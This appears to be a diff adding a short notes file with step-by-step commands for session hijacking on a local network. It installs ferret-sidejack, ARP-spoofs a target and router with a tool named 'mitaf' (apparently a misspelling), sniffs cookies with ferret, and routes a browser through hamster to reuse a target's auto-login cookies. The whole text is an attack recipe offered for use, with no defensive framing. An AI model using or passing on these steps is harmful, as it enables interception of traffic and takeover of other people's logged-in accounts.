@@ -1,0 +1,15 @@
+//Uses the cookies that are used to auto-sign in and injects into our own browser from a target computer
+
+apt-get install ferret-sidejack
+
+mitaf --arp --spoof --gateway (ROUTERIP) --target (TARGETIP) -i (INTEFACE)
+meanwhile
+ferret -i (INTERFACE)
+meanwhile
+hamster
+
+make sure to modify your proxy settings as so
+
+1.manual proxy configuration
+then input the rest of the info hamster gives you for the proxy
+//next go to the ip and port hamster gives you
